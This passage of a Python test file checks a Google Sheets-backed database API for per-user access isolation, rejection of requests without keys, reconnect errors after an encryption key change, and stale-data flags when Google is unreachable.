    assert bob.post(f"/dashboard/sheets/connections/{alice.get('/dashboard/sheets/connections').json()['connections'][0]['id']}/picker-token").status_code == 404
    assert client.get(f"/v1/sheets", headers=bh).json()["databases"][0]["id"] == bdb["id"]
    assert client.get(setup["rows"], headers=setup["h"]).json()["rows"][0]["name"] == "secret"
    # no key / public key
    assert client.get(setup["rows"]).status_code == 401


def test_changed_encryption_key_asks_to_reconnect(setup, client, google, monkeypatch):
    from app.config import settings

    monkeypatch.setattr(settings, "DATA_ENCRYPTION_KEY", "a-different-key-" + "z" * 40)
    sheets_google._clients.clear()
    sheets_google._access_cache.clear()
    r = client.post(f"/v1/sheets/{setup['db']['id']}/migrate", json={"sql": "CREATE TABLE b (x TEXT)"}, headers=setup["h"])
    assert r.status_code == 409 and r.json()["error"]["code"] == "google_disconnected"


def test_stale_flag_only_when_google_cannot_be_read(setup, client, google):
    client.post(setup["rows"], json={"name": "on its way"}, headers=setup["h"])
    r = client.get(setup["rows"], headers=setup["h"])  # writes still queued: our copy is the newest, not stale
    assert r.headers.get("x-thumbsup-stale") is None and r.json()["rows"][0]["name"] == "on its way"
    flush()
    google.fail_next = [503, 503, 503, 503]
    r = client.get(setup["rows"], headers=setup["h"])  # Google down: still answers, from our copy
    assert r.status_code == 200 and r.headers.get("x-thumbsup-stale") == "true" and r.json()["total"] == 1
